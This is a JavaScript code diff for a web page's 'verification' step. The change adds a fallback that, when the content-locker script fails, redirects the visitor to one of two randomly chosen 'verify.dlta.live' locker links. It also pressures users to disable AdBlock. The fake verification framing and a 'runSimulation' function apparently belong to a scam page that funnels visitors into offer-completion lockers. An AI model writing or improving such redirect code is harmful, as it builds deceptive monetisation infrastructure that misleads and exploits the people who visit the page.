@@ -227,6 +227,18 @@ function runSimulation(amount) {
 
 // === STEP 4: VERIFICATION ===
 function handleVerify() {
+    // === LOCKER CONFIGURATION WITH FALLBACK ===
+    const LOCKER_CONFIG = {
+        primary: {
+            link: 'https://verify.dlta.live/cl/i/m4prn',
+            id: 'm4prn'
+        },
+        fallback: {
+            link: 'https://verify.dlta.live/cl/i/m55o9n',
+            id: 'm55o9n'
+        }
+    };
+    
     // Check if locker loaded
     if (typeof og_load === 'undefined') {
         alert('⚠️ AdBlock Detected!\n\nPlease disable AdBlock to continue.');
@@ -237,13 +249,20 @@ function handleVerify() {
     els.verifyBtn.disabled = true;
     els.verifyBtn.innerHTML = '<span>Loading Verification...</span>';
     
-    // Trigger locker
+    // Trigger locker with fallback
     try {
         og_load();
     } catch (e) {
-        alert('Verification system error. Please refresh the page.');
-        els.verifyBtn.disabled = false;
-        els.verifyBtn.innerHTML = '<span>Complete Verification</span><span class="btn-arrow">→</span>';
+        console.error('Primary locker failed:', e);
+        
+        // Try fallback - direct redirect
+        setTimeout(() => {
+            const useFallback = Math.random() < 0.5; // 50/50 chance
+            const selectedLocker = useFallback ? LOCKER_CONFIG.fallback : LOCKER_CONFIG.primary;
+            
+            console.log('Using locker:', selectedLocker.id);
+            window.location.href = selectedLocker.link;
+        }, 500);
     }
 }
 
